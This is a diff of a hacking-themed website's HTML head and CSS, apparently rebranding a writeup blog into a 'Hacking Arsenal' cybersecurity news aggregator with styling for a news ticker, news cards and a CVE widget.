@@ -4,8 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
 <meta name="theme-color" content="#0A0E0A">
-<meta name="description" content="Johan Cicada — Real hacking writeups, TryHackMe & HTB walkthroughs, 2000+ cybersecurity tools, bug bounty articles and guides.">
-<title>Johan Cicada — Hacking Writeups & Tool Arsenal</title>
+<meta name="description" content="Hacking Arsenal — Live cybersecurity news, 2000+ hacking tools, bug bounty methodology. Real-time threat intelligence from The Hacker News, Krebs, Dark Reading, BleepingComputer and SecurityWeek.">
+<title>Hacking Arsenal — Live Cyber News & Tools</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -35,10 +35,10 @@ ul{list-style:none}
 ::-webkit-scrollbar-thumb{background:var(--green-dim);border-radius:4px}
 ::-webkit-scrollbar-thumb:hover{background:var(--green)}
 
-#matrix{position:fixed;inset:0;z-index:0;opacity:.14;pointer-events:none}
-.scanlines{position:fixed;inset:0;z-index:9998;pointer-events:none;background:repeating-linear-gradient(to bottom,transparent 0,transparent 2px,rgba(0,255,65,.025) 3px,rgba(0,255,65,.025) 4px);mix-blend-mode:screen}
+#matrix{position:fixed;inset:0;z-index:0;opacity:.1;pointer-events:none}
+.scanlines{position:fixed;inset:0;z-index:9998;pointer-events:none;background:repeating-linear-gradient(to bottom,transparent 0,transparent 2px,rgba(0,255,65,.02) 3px,rgba(0,255,65,.02) 4px);mix-blend-mode:screen}
 
-/* PRELOADER */
+/* ═══ PRELOADER ═══ */
 #pre{position:fixed;inset:0;background:#000;z-index:10000;padding:6vw 5%;display:flex;align-items:flex-start;font-family:var(--mono);font-size:clamp(.7rem,2.4vw,.9rem);color:var(--green);transition:opacity .7s ease,visibility .7s;overflow:hidden}
 #pre.out{opacity:0;visibility:hidden}
 #preText{white-space:pre-wrap;line-height:1.9;text-shadow:0 0 10px var(--green-glow);max-width:100%}
@@ -46,21 +46,32 @@ ul{list-style:none}
 .cursor{display:inline-block;width:9px;height:1em;background:var(--green);vertical-align:-2px;animation:blink 1s steps(1) infinite;box-shadow:0 0 10px var(--green-glow)}
 @keyframes blink{50%{opacity:0}}
 
-/* NAV */
-.nav{position:fixed;top:0;left:0;right:0;z-index:900;padding:14px 5%;display:flex;justify-content:space-between;align-items:center;transition:all .4s var(--ease2);border-bottom:1px solid transparent}
+/* ═══ BREAKING TICKER ═══ */
+.ticker{position:fixed;top:0;left:0;right:0;z-index:950;height:32px;background:linear-gradient(90deg,#0A0E0A,#0F1510,#0A0E0A);border-bottom:1px solid var(--border);display:flex;align-items:center;overflow:hidden;font-family:var(--mono);font-size:.68rem}
+.ticker-label{background:var(--red);color:#000;padding:0 12px;height:100%;display:flex;align-items:center;gap:6px;font-weight:700;letter-spacing:.1em;flex-shrink:0;position:relative;z-index:2;text-transform:uppercase}
+.ticker-label i{animation:pulse 1.4s infinite}
+@keyframes pulse{50%{opacity:.4}}
+.ticker-track{display:flex;gap:50px;white-space:nowrap;animation:tick 80s linear infinite;padding-left:20px;color:var(--text)}
+.ticker-track::before{content:''}
+.ticker-item{display:inline-flex;align-items:center;gap:10px;cursor:pointer;transition:color .2s}
+.ticker-item:hover{color:var(--green2)}
+.ticker-item::before{content:'▸';color:var(--green);font-weight:700}
+.ticker-item .src{color:var(--muted);font-size:.6rem;padding:1px 6px;background:rgba(0,255,65,.06);border:1px solid var(--border);border-radius:3px;letter-spacing:.05em}
+@keyframes tick{to{transform:translateX(-50%)}}
+@media(max-width:700px){.ticker{font-size:.6rem;height:28px}.ticker-label{padding:0 8px;font-size:.58rem}}
+
+/* ═══ NAV ═══ */
+.nav{position:fixed;top:32px;left:0;right:0;z-index:900;padding:14px 5%;display:flex;justify-content:space-between;align-items:center;transition:all .4s var(--ease2);border-bottom:1px solid transparent}
 .nav.sc{padding:10px 5%;background:rgba(5,8,6,.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom-color:var(--border)}
+@media(max-width:700px){.nav{top:28px}}
 .brand{display:flex;align-items:center;gap:10px;font-family:var(--disp);font-weight:700;font-size:1.05rem;color:var(--green);letter-spacing:.08em;text-shadow:0 0 12px var(--green-glow)}
 .brand-mark{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,rgba(0,255,65,.15),rgba(0,229,255,.1));border:1px solid var(--border2);display:grid;place-items:center;font-size:.9rem;color:var(--green);transition:transform .6s var(--ease)}
 .brand:hover .brand-mark{transform:rotate(360deg)}
 .menu{display:flex;gap:24px;align-items:center}
 .menu a{font-family:var(--mono);font-size:.72rem;letter-spacing:.1em;color:var(--muted);position:relative;padding:5px 0;transition:color .3s;text-transform:uppercase}
-.menu a::before{content:'./';opacity:.5}
 .menu a::after{content:'';position:absolute;bottom:0;left:0;width:0;height:1px;background:var(--green);transition:width .35s var(--ease);box-shadow:0 0 8px var(--green-glow)}
 .menu a:hover{color:var(--green2);text-shadow:0 0 10px var(--green-glow)}
 .menu a:hover::after{width:100%}
-.menu .cta{padding:8px 16px;border:1px solid var(--green);border-radius:6px;color:var(--green);font-weight:600}
-.menu .cta::before,.menu .cta::after{display:none}
-.menu .cta:hover{background:rgba(0,255,65,.1);box-shadow:0 0 20px var(--green-glow)}
 .burger{display:none;width:32px;height:22px;position:relative;z-index:1002}
 .burger span{position:absolute;left:0;height:2px;background:var(--green);width:100%;transition:all .4s var(--ease2);box-shadow:0 0 6px var(--green-glow)}
 .burger span:nth-child(1){top:0}.burger span:nth-child(2){top:10px;width:65%}.burger span:nth-child(3){top:20px}
@@ -85,7 +96,8 @@ section{padding:80px 0;position:relative;z-index:2}
 .sec-hd.c{text-align:center;margin-left:auto;margin-right:auto;max-width:700px}
 .sec-hd.c .sec-p{margin-left:auto;margin-right:auto}
 
-.hero{min-height:100vh;display:flex;align-items:center;padding:120px 0 60px;position:relative;overflow:hidden}
+/* ═══ HERO — LIVE STATUS ═══ */
+.hero{min-height:100vh;display:flex;align-items:center;padding:130px 0 60px;position:relative;overflow:hidden}
 .hero::before{content:'';position:absolute;top:20%;left:-20%;width:60%;height:60%;background:radial-gradient(circle,rgba(0,255,65,.09),transparent 70%);pointer-events:none}
 .hero::after{content:'';position:absolute;bottom:-20%;right:-10%;width:50%;height:60%;background:radial-gradient(circle,rgba(0,229,255,.06),transparent 70%);pointer-events:none}
 .hero-in{display:grid;grid-template-columns:1.15fr .85fr;gap:50px;align-items:center;width:100%}
@@ -106,20 +118,16 @@ section{padding:80px 0;position:relative;z-index:2}
 .btn.solid::before{background:var(--green2)}
 .btn.solid:hover{box-shadow:0 0 40px var(--green-glow)}
 
-.term{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.6),0 0 0 1px rgba(0,255,65,.06)}
-.term-bar{display:flex;align-items:center;gap:7px;padding:10px 14px;background:var(--bg3);border-bottom:1px solid var(--border)}
-.dot{width:10px;height:10px;border-radius:50%}
-.dot.r{background:#FF5F56}.dot.y{background:#FFBD2E}.dot.g{background:#27C93F}
-.term-title{margin-left:10px;font-family:var(--mono);font-size:.68rem;color:var(--muted)}
-.term-body{padding:18px;font-family:var(--mono);font-size:.76rem;line-height:1.9;color:var(--text);min-height:280px}
-.term-body .line{display:flex;gap:8px;margin-bottom:2px;opacity:0;transform:translateY(6px);transition:all .4s var(--ease)}
-.term-body .line.show{opacity:1;transform:translateY(0)}
-.term-body .k{color:var(--green);min-width:60px}
-.term-body .v{color:#fff}
-.term-body .cy{color:var(--cyan)}
-.term-body .am{color:var(--amber)}
-.term-body .rd{color:var(--red)}
-.term-body .pu{color:var(--purple)}
+.live-panel{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+.live-header{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.live-badge{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:.68rem;color:var(--green);letter-spacing:.15em;text-transform:uppercase;font-weight:600}
+.live-dot{width:8px;height:8px;border-radius:50%;background:var(--red);box-shadow:0 0 12px var(--red);animation:pulse 1.4s infinite}
+.live-time{font-family:var(--mono);font-size:.65rem;color:var(--muted);letter-spacing:.05em}
+.live-stats{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border)}
+.live-stat{background:var(--card);padding:16px}
+.live-stat .k{font-family:var(--mono);font-size:.6rem;color:var(--muted);letter-spacing:.15em;text-transform:uppercase;margin-bottom:6px}
+.live-stat .v{font-family:var(--disp);font-size:1.4rem;font-weight:700;color:var(--green);text-shadow:0 0 16px var(--green-glow);line-height:1}
+.live-stat .sub{font-family:var(--mono);font-size:.62rem;color:var(--muted);margin-top:4px;letter-spacing:.03em}
 
 .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-top:40px}
 .stat{background:var(--card);padding:20px;text-align:center;transition:background .3s}
@@ -128,58 +136,93 @@ section{padding:80px 0;position:relative;z-index:2}
 .stat-lbl{font-family:var(--mono);font-size:.6rem;letter-spacing:.2em;text-transform:uppercase;color:var(--muted)}
 @media(max-width:600px){.stats{grid-template-columns:repeat(2,1fr)}}
 
-.mq{padding:16px 0;background:var(--bg2);border-top:1px solid var(--border);border-bottom:1px solid var(--border);overflow:hidden;position:relative;z-index:2}
-.mq-tr{display:flex;gap:44px;white-space:nowrap;animation:mq 40s linear infinite;width:max-content}
-.mq-it{font-family:var(--mono);font-size:.82rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);display:flex;align-items:center;gap:44px}
-.mq-it::after{content:'◆';font-size:.5rem;color:var(--green);opacity:.6}
-@keyframes mq{to{transform:translateX(-50%)}}
+/* ═══ NEWS CONTROLS ═══ */
+.news-controls{display:flex;flex-direction:column;gap:14px;margin-bottom:28px}
+.news-bar{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.news-search{flex:1;min-width:220px;display:flex;align-items:center;gap:10px;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:11px 16px;transition:all .3s}
+.news-search:focus-within{border-color:var(--green);box-shadow:0 0 20px rgba(0,255,65,.1)}
+.news-search i{color:var(--green);font-size:.9rem}
+.news-search input{flex:1;font-family:var(--mono);font-size:.85rem;color:#fff;min-width:0}
+.news-search input::placeholder{color:var(--muted2)}
+.refresh-btn{display:inline-flex;align-items:center;gap:8px;padding:11px 16px;font-family:var(--mono);font-size:.68rem;font-weight:600;letter-spacing:.12em;text-transform:uppercase;background:var(--card);border:1px solid var(--border);border-radius:8px;color:var(--green);transition:all .3s;white-space:nowrap}
+.refresh-btn:hover{border-color:var(--green);background:var(--card2);box-shadow:0 0 16px rgba(0,255,65,.15)}
+.refresh-btn.spinning i{animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.news-cats{display:flex;gap:8px;flex-wrap:wrap}
+.ncat{padding:8px 14px;font-family:var(--mono);font-size:.65rem;font-weight:600;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);border:1px solid var(--border);border-radius:100px;transition:all .3s;background:transparent;cursor:pointer;white-space:nowrap}
+.ncat:hover{color:var(--green);border-color:var(--border2)}
+.ncat.on{background:rgba(0,255,65,.12);color:var(--green);border-color:var(--green);box-shadow:0 0 16px rgba(0,255,65,.2)}
+.ncat .count{margin-left:6px;font-size:.55rem;opacity:.7}
 
-/* ARTICLES (featured) */
-.art-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:18px}
-.art{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:22px;transition:all .4s var(--ease2);position:relative;display:flex;flex-direction:column;cursor:pointer;overflow:hidden}
-.art::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));transform:scaleX(0);transform-origin:left;transition:transform .5s var(--ease)}
-.art:hover::before{transform:scaleX(1)}
-.art:hover{border-color:var(--border2);transform:translateY(-4px);background:var(--card2);box-shadow:0 20px 50px rgba(0,0,0,.5)}
-.art-num{font-family:var(--mono);font-size:.65rem;letter-spacing:.2em;color:var(--green);opacity:.7;margin-bottom:10px}
-.art h3{font-family:var(--disp);font-size:1.02rem;font-weight:600;color:#fff;margin-bottom:8px;line-height:1.35}
-.art:hover h3{color:var(--green2)}
-.art p{font-size:.82rem;color:var(--muted);line-height:1.65;margin-bottom:14px;flex:1;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
-.art-meta{display:flex;gap:14px;font-family:var(--mono);font-size:.65rem;color:var(--muted2);letter-spacing:.05em}
-.art-meta i{color:var(--green);font-size:.7rem;margin-right:4px}
+/* ═══ NEWS GRID — MASONRY ═══ */
+.news-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:18px}
+.news-card{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;transition:all .45s var(--ease2);position:relative;display:flex;flex-direction:column;animation:cardIn .5s var(--ease) backwards}
+@keyframes cardIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.news-card:hover{transform:translateY(-5px);border-color:var(--border2);box-shadow:0 20px 50px rgba(0,0,0,.6),0 0 30px rgba(0,255,65,.08)}
+.news-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));transform:scaleX(0);transform-origin:left;transition:transform .5s var(--ease);z-index:3}
+.news-card:hover::before{transform:scaleX(1)}
+.nc-media{aspect-ratio:16/9;background:linear-gradient(135deg,var(--bg3),var(--card2));position:relative;overflow:hidden}
+.nc-media img{width:100%;height:100%;object-fit:cover;transition:transform 1.2s var(--ease)}
+.news-card:hover .nc-media img{transform:scale(1.06)}
+.nc-media::after{content:'';position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent 0,transparent 12px,rgba(0,255,65,.04) 12px,rgba(0,255,65,.04) 24px);pointer-events:none}
+.nc-source-badge{position:absolute;top:12px;left:12px;z-index:2;font-family:var(--mono);font-size:.58rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;padding:5px 10px;border-radius:5px;background:rgba(0,0,0,.82);backdrop-filter:blur(8px);border:1px solid var(--border2);color:var(--green)}
+.nc-source-badge.thn{color:#00E5FF;border-color:rgba(0,229,255,.4)}
+.nc-source-badge.krebs{color:#FFB000;border-color:rgba(255,176,0,.4)}
+.nc-source-badge.dr{color:#FF2D55;border-color:rgba(255,45,85,.4)}
+.nc-source-badge.bc{color:#A855F7;border-color:rgba(168,85,247,.4)}
+.nc-source-badge.sw{color:#3DFF6E;border-color:rgba(61,255,110,.4)}
+.nc-time{position:absolute;bottom:12px;right:12px;z-index:2;font-family:var(--mono);font-size:.58rem;color:#fff;letter-spacing:.05em;padding:4px 8px;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);border-radius:4px}
+.nc-body{padding:18px;display:flex;flex-direction:column;flex:1}
+.nc-body h3{font-family:var(--disp);font-size:1rem;font-weight:600;color:#fff;margin-bottom:8px;line-height:1.35;transition:color .3s;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.news-card:hover .nc-body h3{color:var(--green2)}
+.nc-body p{font-size:.8rem;color:var(--muted);line-height:1.65;margin-bottom:14px;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden;flex:1}
+.nc-footer{display:flex;justify-content:space-between;align-items:center;padding-top:12px;border-top:1px solid var(--border);margin-top:auto}
+.nc-author{font-family:var(--mono);font-size:.62rem;color:var(--muted2);letter-spacing:.03em;display:flex;align-items:center;gap:6px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;min-width:0}
+.nc-author i{color:var(--green);font-size:.65rem;flex-shrink:0}
+.nc-read{font-family:var(--mono);font-size:.62rem;font-weight:600;letter-spacing:.08em;color:var(--green);display:flex;align-items:center;gap:6px;flex-shrink:0;transition:gap .3s}
+.news-card:hover .nc-read{gap:10px}
 
-/* WRITEUPS */
-.wgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:18px}
-.wcard{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;transition:all .45s var(--ease2);position:relative;cursor:pointer}
-.wcard:hover{transform:translateY(-6px);border-color:var(--border2);box-shadow:0 20px 50px rgba(0,0,0,.6),0 0 30px rgba(0,255,65,.08)}
-.wcard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));transform:scaleX(0);transform-origin:left;transition:transform .5s var(--ease)}
-.wcard:hover::before{transform:scaleX(1)}
-.wcard-img{aspect-ratio:16/9;background:linear-gradient(135deg,var(--bg3),var(--card2));display:grid;place-items:center;position:relative;overflow:hidden}
-.wcard-img i{font-size:3rem;color:var(--green);opacity:.35;transition:all .5s}
-.wcard:hover .wcard-img i{opacity:.6;transform:scale(1.1) rotate(-6deg)}
-.wcard-img::after{content:'';position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent 0,transparent 12px,rgba(0,255,65,.03) 12px,rgba(0,255,65,.03) 24px)}
-.wcard-badges{position:absolute;top:12px;left:12px;display:flex;gap:6px;z-index:2}
-.badge{font-family:var(--mono);font-size:.58rem;font-weight:600;letter-spacing:.12em;text-transform:uppercase;padding:4px 9px;border-radius:4px;background:rgba(0,0,0,.75);backdrop-filter:blur(6px);border:1px solid var(--border2)}
-.badge.easy{color:#27C93F;border-color:rgba(39,201,63,.4)}
-.badge.medium{color:var(--amber);border-color:rgba(255,176,0,.4)}
-.badge.hard{color:var(--red);border-color:rgba(255,45,85,.4)}
-.badge.thm{color:#00E5FF;border-color:rgba(0,229,255,.4)}
-.badge.htb{color:#9FEF00;border-color:rgba(159,239,0,.4)}
-.wcard-body{padding:18px}
-.wcard h3{font-family:var(--disp);font-size:1.05rem;font-weight:600;color:#fff;margin-bottom:8px;line-height:1.3;transition:color .3s}
-.wcard:hover h3{color:var(--green2)}
-.wcard p{font-size:.8rem;color:var(--muted);line-height:1.6;margin-bottom:12px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
-.wcard-meta{display:flex;justify-content:space-between;align-items:center;padding-top:12px;border-top:1px solid var(--border)}
-.wcard-meta span{font-family:var(--mono);font-size:.65rem;color:var(--muted2);letter-spacing:.08em}
-.wcard-meta i{color:var(--green);font-size:.7rem}
+/* ═══ LOADING / EMPTY ═══ */
+.news-skeleton{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.sk-media{aspect-ratio:16/9;background:linear-gradient(90deg,var(--card) 0%,var(--card2) 50%,var(--card) 100%);background-size:200% 100%;animation:sk 1.4s infinite}
+.sk-body{padding:18px}
+.sk-line{height:12px;border-radius:4px;background:linear-gradient(90deg,var(--card) 0%,var(--card2) 50%,var(--card) 100%);background-size:200% 100%;animation:sk 1.4s infinite;margin-bottom:10px}
+.sk-line:nth-child(2){width:80%}
+.sk-line:nth-child(3){width:60%;height:8px}
+.sk-line.short{width:40%}
+@keyframes sk{to{background-position:-200% 0}}
 
-/* TOOLS */
+.news-empty{grid-column:1/-1;padding:60px 20px;text-align:center;color:var(--muted)}
+.news-empty i{font-size:2.4rem;color:var(--muted2);margin-bottom:16px;display:block}
+.news-empty h3{font-family:var(--disp);font-size:1.1rem;font-weight:600;color:#fff;margin-bottom:8px}
+.news-empty p{font-size:.85rem;margin-bottom:18px;font-family:var(--mono)}
+.news-empty button{padding:11px 22px;background:var(--green);color:#000;font-family:var(--mono);font-size:.68rem;font-weight:700;letter-spacing:.15em;text-transform:uppercase;border-radius:6px}
+
+/* ═══ CVE SIDEBAR WIDGET ═══ */
+.cve-widget{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-top:24px}
+.cve-head{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.cve-head h4{font-family:var(--disp);font-size:.88rem;font-weight:600;color:#fff;display:flex;align-items:center;gap:8px;letter-spacing:.02em}
+.cve-head h4 i{color:var(--red)}
+.cve-head span{font-family:var(--mono);font-size:.62rem;color:var(--muted);letter-spacing:.05em}
+.cve-list{padding:8px 0}
+.cve-item{display:flex;align-items:center;gap:12px;padding:12px 18px;transition:background .2s;cursor:pointer;border-bottom:1px solid rgba(0,255,65,.05)}
+.cve-item:last-child{border-bottom:none}
+.cve-item:hover{background:var(--card2)}
+.cve-sev{font-family:var(--mono);font-size:.58rem;font-weight:700;padding:3px 7px;border-radius:4px;letter-spacing:.08em;flex-shrink:0}
+.cve-sev.crit{background:rgba(255,45,85,.15);color:var(--red);border:1px solid rgba(255,45,85,.4)}
+.cve-sev.high{background:rgba(255,176,0,.15);color:var(--amber);border:1px solid rgba(255,176,0,.4)}
+.cve-sev.med{background:rgba(0,229,255,.12);color:var(--cyan);border:1px solid rgba(0,229,255,.4)}
+.cve-id{font-family:var(--mono);font-size:.68rem;color:#fff;font-weight:600;letter-spacing:.03em}
+.cve-desc{font-size:.72rem;color:var(--muted);line-height:1.5;margin-top:2px;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden}
+
+/* ═══ TOOLS ═══ */
 .tool-controls{display:flex;flex-direction:column;gap:14px;margin-bottom:28px}
 .tool-search{display:flex;align-items:center;gap:10px;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:11px 16px;transition:all .3s}
 .tool-search:focus-within{border-color:var(--green);box-shadow:0 0 20px rgba(0,255,65,.1)}
 .tool-search i{color:var(--green);font-size:.9rem}
 .tool-search input{flex:1;font-family:var(--mono);font-size:.85rem;color:#fff;min-width:0}
 .tool-search input::placeholder{color:var(--muted2)}
-.tool-search .count{font-family:var(--mono);font-size:.68rem;color:var(--muted);white-space:nowrap;letter-spacing:.05em}
+.tool-search .count{font-family:var(--mono);font-size:.68rem;color:var(--muted);white-space:nowrap}
 .tool-cats{display:flex;gap:8px;flex-wrap:wrap}
 .tcat{padding:8px 14px;font-family:var(--mono);font-size:.65rem;font-weight:600;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);border:1px solid var(--border);border-radius:100px;transition:all .3s;background:transparent;cursor:pointer;white-space:nowrap}
 .tcat:hover{color:var(--green);border-color:var(--border2)}
@@ -195,15 +238,8 @@ section{padding:80px 0;position:relative;z-index:2}
 .tool p{font-size:.75rem;color:var(--muted);line-height:1.55;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
 .tool-arrow{position:absolute;top:14px;right:14px;color:var(--green);font-size:.65rem;opacity:0;transform:translate(-4px,4px);transition:all .3s}
 .tool:hover .tool-arrow{opacity:1;transform:translate(0,0)}
-.tool-empty{padding:60px 20px;text-align:center;color:var(--muted);font-family:var(--mono);font-size:.82rem;grid-column:1/-1}
 
-.cmd-block{margin-top:32px;background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden}
-.cmd-head{padding:12px 16px;background:var(--bg3);border-bottom:1px solid var(--border);font-family:var(--mono);font-size:.7rem;color:var(--muted);display:flex;align-items:center;gap:8px}
-.cmd-head i{color:var(--green)}
-.cmd-body{padding:16px;font-family:var(--mono);font-size:.78rem;color:var(--text);line-height:1.9;overflow-x:auto}
-.cmd-body .c{color:var(--muted2)}.cmd-body .g{color:var(--green)}.cmd-body .w{color:#fff}
-
-/* BUG BOUNTY */
+/* ═══ BUG BOUNTY ═══ */
 .bb-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
 .bb{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:22px;transition:all .45s var(--ease2);position:relative;overflow:hidden}
 .bb:hover{border-color:var(--border2);transform:translateY(-5px);box-shadow:0 20px 50px rgba(0,0,0,.5)}
@@ -213,7 +249,20 @@ section{padding:80px 0;position:relative;z-index:2}
 .bb-tags{display:flex;gap:6px;flex-wrap:wrap}
 .bb-tag{font-family:var(--mono);font-size:.58rem;letter-spacing:.1em;text-transform:uppercase;padding:3px 9px;background:rgba(0,229,255,.06);border:1px solid rgba(0,229,255,.25);color:var(--cyan);border-radius:100px}
 
-/* ABOUT */
+/* ═══ ARTICLES ═══ */
+.art-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:18px}
+.art{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:22px;transition:all .4s var(--ease2);position:relative;display:flex;flex-direction:column;cursor:pointer;overflow:hidden}
+.art::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));transform:scaleX(0);transform-origin:left;transition:transform .5s var(--ease)}
+.art:hover::before{transform:scaleX(1)}
+.art:hover{border-color:var(--border2);transform:translateY(-4px);background:var(--card2);box-shadow:0 20px 50px rgba(0,0,0,.5)}
+.art-num{font-family:var(--mono);font-size:.65rem;letter-spacing:.2em;color:var(--green);opacity:.7;margin-bottom:10px}
+.art h3{font-family:var(--disp);font-size:1.02rem;font-weight:600;color:#fff;margin-bottom:8px;line-height:1.35}
+.art:hover h3{color:var(--green2)}
+.art p{font-size:.82rem;color:var(--muted);line-height:1.65;margin-bottom:14px;flex:1;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.art-meta{display:flex;gap:14px;font-family:var(--mono);font-size:.65rem;color:var(--muted2);letter-spacing:.05em}
+.art-meta i{color:var(--green);font-size:.7rem;margin-right:4px}
+
+/* ═══ ABOUT ═══ */
 .about-in{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
 @media(max-width:900px){.about-in{grid-template-columns:1fr;gap:32px}}
 .about-txt p{font-size:.92rem;color:var(--muted);line-height:1.85;margin-bottom:16px}
@@ -224,42 +273,45 @@ section{padding:80px 0;position:relative;z-index:2}
 .fact-lbl{font-family:var(--mono);font-size:.6rem;letter-spacing:.18em;text-transform:uppercase;color:var(--muted);margin-bottom:5px}
 .fact-val{font-family:var(--disp);font-size:.9rem;font-weight:600;color:#fff}
 .term-about{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.term-bar{display:flex;align-items:center;gap:7px;padding:10px 14px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.dot{width:10px;height:10px;border-radius:50%}
+.dot.r{background:#FF5F56}.dot.y{background:#FFBD2E}.dot.g{background:#27C93F}
+.term-title{margin-left:10px;font-family:var(--mono);font-size:.68rem;color:var(--muted)}
+.term-body{padding:18px;font-family:var(--mono);font-size:.76rem;line-height:1.9;color:var(--text)}
+.term-body .line{display:flex;gap:8px;margin-bottom:2px}
+.term-body .k{color:var(--green);min-width:60px}
+.term-body .v{color:#fff}
+.term-body .cy{color:var(--cyan)}
+.term-body .am{color:var(--amber)}
+.term-body .rd{color:var(--red)}
+.term-body .pu{color:var(--purple)}
 
-/* ═══════════════════════════════════════
-   ARTICLE READER MODAL
-   ═══════════════════════════════════════ */
+/* ═══ ARTICLE READER ═══ */
 .reader{position:fixed;inset:0;z-index:2000;background:var(--bg);display:flex;flex-direction:column;transform:translateY(100%);transition:transform .45s var(--ease);overflow:hidden}
 .reader.on{transform:translateY(0)}
 .reader-bar{display:flex;align-items:center;justify-content:space-between;padding:14px 5%;background:rgba(5,8,6,.95);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);flex-shrink:0;z-index:10}
 .reader-back{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;color:var(--green);padding:6px 0;transition:all .3s}
-.reader-back:hover{gap:12px;text-shadow:0 0 10px var(--green-glow)}
-.reader-title-bar{font-family:var(--mono);font-size:.68rem;color:var(--muted);letter-spacing:.08em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:40%}
+.reader-back:hover{gap:12px}
+.reader-title-bar{font-family:var(--mono);font-size:.68rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:40%}
 .reader-progress{position:absolute;left:0;right:0;bottom:-1px;height:2px;background:transparent}
 .reader-progress-fill{height:100%;background:var(--green);width:0;transition:width .1s linear;box-shadow:0 0 10px var(--green-glow)}
 .reader-body{flex:1;overflow-y:auto;padding:50px 5% 100px}
-.reader-content{max-width:780px;margin:0 auto;font-family:var(--sans);font-size:1rem;line-height:1.85;color:var(--text)}
-.reader-content h1{font-family:var(--disp);font-size:clamp(1.8rem,5vw,2.6rem);font-weight:700;color:#fff;line-height:1.15;letter-spacing:-.02em;margin-bottom:16px}
+.reader-content{max-width:780px;margin:0 auto;font-size:1rem;line-height:1.85;color:var(--text)}
+.reader-content h1{font-family:var(--disp);font-size:clamp(1.8rem,5vw,2.6rem);font-weight:700;color:#fff;line-height:1.15;margin-bottom:16px}
 .reader-content .article-meta{display:flex;gap:18px;flex-wrap:wrap;font-family:var(--mono);font-size:.7rem;color:var(--muted);letter-spacing:.08em;text-transform:uppercase;padding-bottom:24px;margin-bottom:32px;border-bottom:1px solid var(--border)}
-.reader-content .article-meta span{display:inline-flex;align-items:center;gap:6px}
 .reader-content .article-meta i{color:var(--green)}
-.reader-content h2{font-family:var(--disp);font-size:clamp(1.3rem,3.6vw,1.75rem);font-weight:600;color:#fff;line-height:1.3;letter-spacing:-.01em;margin:44px 0 16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
-.reader-content h2::before{content:'§ ';color:var(--green);font-weight:700}
